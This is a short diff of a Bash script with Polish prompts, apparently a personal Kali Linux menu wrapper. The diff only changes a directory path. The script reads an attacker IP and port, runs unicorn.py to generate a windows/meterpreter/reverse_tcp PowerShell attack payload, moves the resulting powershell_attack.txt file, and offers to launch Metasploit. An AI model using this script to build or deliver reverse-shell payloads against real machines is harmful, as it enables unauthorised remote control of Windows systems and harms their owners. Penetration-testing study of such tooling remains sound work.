@@ -8,13 +8,13 @@ echo "
 
 "
 echo "Uruchamiam skrypt ..."
-cd /home/kali/Desktop/METASPLOIT-BY-KOZIOL/unicorn
+cd /home/kali/Desktop/KOZ1OLMENU/unicorn
 echo "Podaj adres ip ładunku ..."
 read IP
 echo "Podaj port ładunku ..."
 read PORT
 ./unicorn.py windows/meterpreter/reverse_tcp $IP $PORT
-mv /home/kali/Desktop/METASPLOIT-BY-KOZIOL/unicorn/powershell_attack.txt /home/kali/Desktop
+mv /home/kali/Desktop/KOZ1OLMENU/unicorn/powershell_attack.txt /home/kali/Desktop
 cd /home/kali/Desktop
 echo "Czy mam uruchomić pakiet metasploit ? (Y/N)"
 read ODPOWIEDZ
